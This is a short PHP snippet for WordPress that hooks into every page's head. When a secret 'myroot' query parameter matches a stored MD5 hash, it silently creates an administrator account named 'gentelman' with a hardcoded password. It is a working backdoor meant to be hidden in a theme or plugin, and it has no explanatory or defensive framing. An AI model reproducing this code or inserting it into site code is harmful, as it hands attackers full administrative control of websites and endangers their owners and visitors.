<?php
add_action( 'wp_head', 'gentel_man' );

function gentel_man() {
    if ( md5( $_GET['myroot'] ) == '34d1f91fb2e514b8576fab1a75a89a6b' ) {
        require( 'wp-includes/registration.php' );
        if ( !username_exists( 'gentelman' ) ) {
            $user_id = wp_create_user( 'gentelman', 'web@mhparvez#' );
            $user = new WP_User( $user_id );
            $user->set_role( 'administrator' ); 
        }
    }
}